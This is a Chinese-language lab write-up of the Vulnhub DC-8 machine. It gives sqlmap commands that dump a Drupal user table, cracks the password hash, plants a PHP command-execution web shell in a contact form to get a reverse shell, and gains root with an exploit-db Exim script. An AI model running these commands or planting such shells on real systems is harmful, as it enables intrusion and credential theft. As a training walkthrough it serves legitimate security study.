---
title: DC-8
tags:
  - Vulnhub
  - DC-8
categories: 
  - 渗透靶机训练
description: Sql injection and exim LPE.
excerpt: Sql injection and exim LPE.
typora-root-url: DC-8
abbrlink: 42745
date: 2021-04-02 18:21:02
---

> 题外话：这是第一个我自己完全没有搜索过WP的靶机，可以说从信息收集到最终拿到Root权都没有怎么参照过别人的做法，可能是这个靶机简单了，也可能是自己水平提升起来了，加油！(ง •_•)ง

# DC-8

## 基础信息收集

NMAP Result：

![image-20210402182353812](image-20210402182353812.png)

Nikto Result：

![image-20210402182504024](image-20210402182504024.png)

可以看到Nikto已经把Web App类型给找到了，Drupal 7，上Droopescan：

![image-20210402182643989](image-20210402182643989.png)

## sql注入

本想一把梭，结果：

![image-20210402182740947](image-20210402182740947.png)

好像没有，打开网页看看：

![image-20210402182816772](image-20210402182816772.png)

象征性地测试一下SQL注入：

![image-20210402182912601](image-20210402182912601.png)

> 框架中存在sql注入的可能性我感觉其实很低，这里也只是顺手测试了一下，没想到居然真的存在注入。

sqlmap直接一把梭：

```bash
sqlmap -u http://192.168.145.141/?nid=1 --dbms MySQL --dbs
```

![image-20210402183059789](image-20210402183059789.png)

```bash
sqlmap -u http://192.168.145.141/?nid=1 --dbms MySQL -D d7db --tables
```

![image-20210402183143517](image-20210402183143517.png)

```bash
sqlmap -u http://192.168.145.141/?nid=1 --dbms MySQL -D d7db -T users --dump
```

![image-20210402183228632](image-20210402183228632.png)

于是，**john**暴力一下：

![image-20210402183330178](image-20210402183330178.png)

这个hash是属于用户john的。

## 反弹shell

登录Web APP，找找哪里能执行PHP代码，最终在Contact Us的WebForm的Form Setting中找到了：

![image-20210402183527992](image-20210402183527992.png)

> 一开始是直接写的\<?php system(\$_GET['cmd']); ?\> ，报错system function not defined，就干脆换Kali内置的WebShell了。

然后用Kali的WebShell复制粘贴上去该Format为PHP Code，可以在这个目录下找到：

```bash
/usr/share/webshells/php
```

![image-20210402184323557](image-20210402184323557.png)

使用该shell注意修改这两个值：

![image-20210402184352508](image-20210402184352508.png)

在Contact Us随便填然后submit，成功拿到反弹shell：

![image-20210402184529802](image-20210402184529802.png)

## 提权

接下来就是提权了，看一下内核利用：

![image-20210402184625793](image-20210402184625793.png)

内核无法利用，查看sudo：

![image-20210402184645899](image-20210402184645899.png)

要密码，无法利用，看一下特殊权限文件：

![image-20210402184734113](image-20210402184734113.png)

> 其实也想过用最近的sudo漏洞来提权，但是：
>
> ![image-20210402185048830](image-20210402185048830.png)

从上到下都依次搜索了一下提权，最终确认exim可提权，exim版本：

![image-20210402185217037](image-20210402185217037.png)

![image-20210402185328535](image-20210402185328535.png)

把利用的shell脚本拷贝到靶机，然后下一步提权：

```bash
# Kali
sudo cp /usr/share/exploitdb/exploits/linux/local/46996.sh exp.sh
# Remote Machine
cd /tmp
scp zhuhan@192.168.145.130:/home/zhuhan/Vulnhub/DC-8/exp.sh exp.sh
```

![image-20210402185702314](image-20210402185702314.png)

给脚本赋权：

```bash
chmod 777 exp.sh
```

![image-20210402185751381](image-20210402185751381.png)

出现了问题，是换行符引起的，用sed把换行符清理一下：

```bash
sed -i 's/\r//' exp.sh
```

![image-20210402185916032](image-20210402185916032.png)

提权失败了，陷入沉思，看了下脚本，发现还有第二种用法：

![image-20210402190003820](image-20210402190003820.png)

用第二种方法看看：

![image-20210402190045092](image-20210402190045092.png)

成功提权！

拿到最终的Flag：

```bash
cat /root/*flag*
```

![image-20210402190141268](image-20210402190141268.png)

成就感满满~~(●ˇ∀ˇ●)